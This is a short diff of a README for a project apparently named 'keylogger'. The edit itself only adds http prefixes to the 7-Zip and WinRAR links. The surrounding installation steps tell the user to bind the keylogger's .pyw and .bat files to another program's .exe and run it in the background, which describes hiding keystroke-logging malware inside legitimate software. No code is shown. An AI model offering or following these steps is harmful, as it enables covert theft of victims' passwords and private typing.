@@ -9,7 +9,7 @@
 ## Installation steps
  - Install on your Windows computer Python
  - [Download](https://github.com/SuriyaaKudoIsc/keylogger/archive/master.zip) this project
- - Extract the files (e.g. with [7-Zip](www.7-zip.org) or [WinRAR](www.rarlab.com))
+ - Extract the files (e.g. with [7-Zip](http://www.7-zip.org) or [WinRAR](http://www.rarlab.com))
  - Connect your .pyw and .bat files with an .exe file of a program
  - Run the keylogger in the background
  - Done!
